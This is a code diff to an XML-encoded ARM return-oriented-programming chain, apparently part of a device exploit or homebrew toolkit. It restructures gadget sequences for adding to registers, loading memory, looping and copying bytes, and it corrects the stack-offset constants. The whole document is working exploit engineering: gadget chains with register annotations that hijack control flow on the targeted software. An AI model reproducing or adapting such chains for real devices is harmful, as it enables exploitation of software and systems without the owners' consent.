@@ -21,12 +21,11 @@ arguments:
 		<data>0</data>                                      <!-- R4 -->
 
 		<!-- r0 += 4 * rop_size_words -->
-		<data>GADGET_ADDRESS(pop_r4_pc)</data>              <!-- PC -->
-		<data>GADGET_ADDRESS(pop_pc)</data>                 <!-- R4 -->
-		<data>GADGET_ADDRESS(blx_r4-pop_r4_pc)</data>       <!-- PC -->
-		<data>GADGET_ADDRESS(pop_r1_pc)</data>              <!-- PC --> <!-- now LR = pop {r4, pc} -->
+		<data>GADGET_ADDRESS(pop_r1_pc)</data>              <!-- PC -->
 		<data>ARG1</data>                                   <!-- R1 -->
-		<data>GADGET_ADDRESS(adds_r0_r1)</data>             <!-- PC -->
+		<data>GADGET_ADDRESS(pop_r4_pc)</data>              <!-- PC -->
+		<data>GADGET_ADDRESS(adds_r0_r1)</data>             <!-- R4 -->
+		<data>GADGET_ADDRESS(blx_r4-pop_r4_pc)</data>       <!-- PC -->
 		<data>0</data>                                      <!-- R4 -->
 
 		<!-- r0 += [rop_base] -->
@@ -40,9 +39,8 @@ arguments:
 		<data>GADGET_ADDRESS(pop_pc)</data>                 <!-- SB -->
 		<data>GADGET_ADDRESS(ldr_r1_r1-blx_sb)</data>       <!-- PC --> <!-- r1 = [rop_base] -->
 		<data>GADGET_ADDRESS(pop_r4_pc)</data>              <!-- PC -->
-		<data>GADGET_ADDRESS(pop_pc)</data>                 <!-- R4 -->
-		<data>GADGET_ADDRESS(blx_r4-pop_r4_pc)</data>       <!-- PC --> <!-- now LR = pop {r4, pc} -->
-		<data>GADGET_ADDRESS(adds_r0_r1)</data>             <!-- PC -->
+		<data>GADGET_ADDRESS(adds_r0_r1)</data>             <!-- R4 -->
+		<data>GADGET_ADDRESS(blx_r4-pop_r4_pc)</data>       <!-- PC -->
 		<data>0</data>                                      <!-- R4 -->
 
 		<!-- r0 = ldrb[r0] -->
@@ -50,12 +48,11 @@ arguments:
 		<data>0</data>                                      <!-- R4 -->
 
 		<!-- r0 += bases_base -->
-		<data>GADGET_ADDRESS(pop_r4_pc)</data>              <!-- PC -->
-		<data>GADGET_ADDRESS(pop_pc)</data>                 <!-- R4 -->
-		<data>GADGET_ADDRESS(blx_r4-pop_r4_pc)</data>       <!-- PC -->
-		<data>GADGET_ADDRESS(pop_r1_pc)</data>              <!-- PC --> <!-- now LR = pop {r4, pc} -->
+		<data>GADGET_ADDRESS(pop_r1_pc)</data>              <!-- PC -->
 		<data>ARG3</data>                                   <!-- R1 -->
-		<data>GADGET_ADDRESS(adds_r0_r1)</data>             <!-- PC -->
+		<data>GADGET_ADDRESS(pop_r4_pc)</data>              <!-- PC -->
+		<data>GADGET_ADDRESS(adds_r0_r1)</data>             <!-- R4 -->
+		<data>GADGET_ADDRESS(blx_r4-pop_r4_pc)</data>       <!-- PC -->
 		<data>0</data>                                      <!-- R4 -->
 
 		<!-- r0 = ldr[r0] -->
@@ -87,9 +84,8 @@ arguments:
 		<data>GADGET_ADDRESS(pop_pc)</data>                 <!-- SB -->
 		<data>GADGET_ADDRESS(ldr_r1_r1-blx_sb)</data>       <!-- PC --> <!-- r1 = [rop_base] -->
 		<data>GADGET_ADDRESS(pop_r4_pc)</data>              <!-- PC -->
-		<data>GADGET_ADDRESS(pop_pc)</data>                 <!-- R4 -->
-		<data>GADGET_ADDRESS(blx_r4-pop_r4_pc)</data>       <!-- PC --> <!-- now LR = pop {r4, pc} -->
-		<data>GADGET_ADDRESS(adds_r0_r1)</data>             <!-- PC -->
+		<data>GADGET_ADDRESS(adds_r0_r1)</data>             <!-- R4 -->
+		<data>GADGET_ADDRESS(blx_r4-pop_r4_pc)</data>       <!-- PC -->
 		<data>0</data>                                      <!-- R4 -->
 
 		<!-- r0 = [r0] -->
@@ -107,9 +103,8 @@ arguments:
 		<data>GADGET_ADDRESS(pop_pc)</data>                 <!-- SB -->
 		<data>GADGET_ADDRESS(ldr_r1_r1-blx_sb)</data>       <!-- PC --> <!-- r1 = [rop_base] -->
 		<data>GADGET_ADDRESS(pop_r4_pc)</data>              <!-- PC -->
-		<data>GADGET_ADDRESS(pop_pc)</data>                 <!-- R4 -->
-		<data>GADGET_ADDRESS(blx_r4-pop_r4_pc)</data>       <!-- PC --> <!-- now LR = pop {r4, pc} -->
-		<data>GADGET_ADDRESS(adds_r0_r1)</data>             <!-- PC -->
+		<data>GADGET_ADDRESS(adds_r0_r1)</data>             <!-- R4 -->
+		<data>GADGET_ADDRESS(blx_r4-pop_r4_pc)</data>       <!-- PC -->
 		<data>0</data>                                      <!-- R4 -->
 
 		<!-- [stored] = r0 -->
@@ -137,9 +132,8 @@ arguments:
 		<data>GADGET_ADDRESS(pop_pc)</data>                 <!-- SB -->
 		<data>GADGET_ADDRESS(ldr_r1_r1-blx_sb)</data>       <!-- PC --> <!-- r1 = [rop_base] -->
 		<data>GADGET_ADDRESS(pop_r4_pc)</data>              <!-- PC -->
-		<data>GADGET_ADDRESS(pop_pc)</data>                 <!-- R4 -->
-		<data>GADGET_ADDRESS(blx_r4-pop_r4_pc)</data>       <!-- PC --> <!-- now LR = pop {r4, pc} -->
-		<data>GADGET_ADDRESS(adds_r0_r1)</data>             <!-- PC -->
+		<data>GADGET_ADDRESS(adds_r0_r1)</data>             <!-- R4 -->
+		<data>GADGET_ADDRESS(blx_r4-pop_r4_pc)</data>       <!-- PC -->
 		<data>0</data>                                      <!-- R4 -->
 
 		<!-- [r0] = [stored], via memcpy(r0, stored, 4) -->
@@ -151,16 +145,15 @@ arguments:
 		<data>0</data>                                      <!-- R4 -->
 
 		<!-- [index] += 1 -->
+		<data>GADGET_ADDRESS(pop_r1_pc)</data>              <!-- PC -->
+		<data>1</data>                                      <!-- R1 -->
 		<data>GADGET_ADDRESS(pop_r0_pc)</data>
 		<data>ARG0</data>                                   <!-- R0 -->
 		<data>GADGET_ADDRESS(ldr_r0_r0-pop_r4_pc)</data>    <!-- PC -->
 		<data>0</data>                                      <!-- R4 -->
 		<data>GADGET_ADDRESS(pop_r4_pc)</data>              <!-- PC -->
-		<data>GADGET_ADDRESS(pop_pc)</data>                 <!-- R4 -->
+		<data>GADGET_ADDRESS(adds_r0_r1)</data>             <!-- R4 -->
 		<data>GADGET_ADDRESS(blx_r4-pop_r4_pc)</data>       <!-- PC -->
-		<data>GADGET_ADDRESS(pop_r1_pc)</data>              <!-- PC --> <!-- now LR = pop {r4, pc} -->
-		<data>1</data>                                      <!-- R1 -->
-		<data>GADGET_ADDRESS(adds_r0_r1)</data>             <!-- PC -->
 		<data>0</data>                                      <!-- R4 -->
 		<data>GADGET_ADDRESS(pop_r1_pc)</data>              <!-- PC -->
 		<data>ARG0</data>                                   <!-- R1 -->
@@ -182,7 +175,7 @@ arguments:
 		<!-- set R0 = sp offset if continue to loop, 0 if exiting rop chain -->
 
 		<data>GADGET_ADDRESS(pop_r1_pc)</data>              <!-- PC -->
-		<data>-668</data>                                  <!-- R1 -->
+		<data>-636</data>                                   <!-- R1 --> <!-- = -(number of |data| before RETURN) * 4 -->
 		<data>GADGET_ADDRESS(pop_r4_pc)</data>              <!-- PC -->
 		<data>GADGET_ADDRESS(mul_r0_r1-bx_lr)</data>        <!-- R4 -->
 		<data>GADGET_ADDRESS(blx_r4-pop_r4_pc)</data>       <!-- PC -->
@@ -210,14 +203,13 @@ arguments:
 		<data>GADGET_ADDRESS(pop_pc)</data>                 <!-- SB -->
 		<data>GADGET_ADDRESS(ldr_r1_r1-blx_sb)</data>       <!-- PC --> <!-- r1 = [stored] -->
 		<data>GADGET_ADDRESS(pop_r4_pc)</data>              <!-- PC -->
-		<data>GADGET_ADDRESS(pop_pc)</data>                 <!-- R4 -->
-		<data>GADGET_ADDRESS(blx_r4-pop_r4_pc)</data>       <!-- PC --> <!-- now LR = pop {r4, pc} -->
-		<data>GADGET_ADDRESS(adds_r0_r1)</data>             <!-- PC -->
+		<data>GADGET_ADDRESS(adds_r0_r1)</data>             <!-- R4 -->
+		<data>GADGET_ADDRESS(blx_r4-pop_r4_pc)</data>       <!-- PC -->
 		<data>0</data>                                      <!-- R4 -->
 
 		<!-- r0 += const -->
 		<data>GADGET_ADDRESS(pop_r1_pc)</data>              <!-- PC -->
-		<data>104</data>                                    <!-- R1 -->
+		<data>100</data>                                    <!-- R1 --> <!-- = (number of |data| after mov_r0_sp-blx_r2 and before RETURN_ADDRESS) * 4 -->
 		<data>GADGET_ADDRESS(pop_r4_pc)</data>              <!-- PC -->
 		<data>GADGET_ADDRESS(adds_r0_r1)</data>             <!-- R4 -->
 		<data>GADGET_ADDRESS(blx_r4-pop_r4_pc)</data>       <!-- PC -->
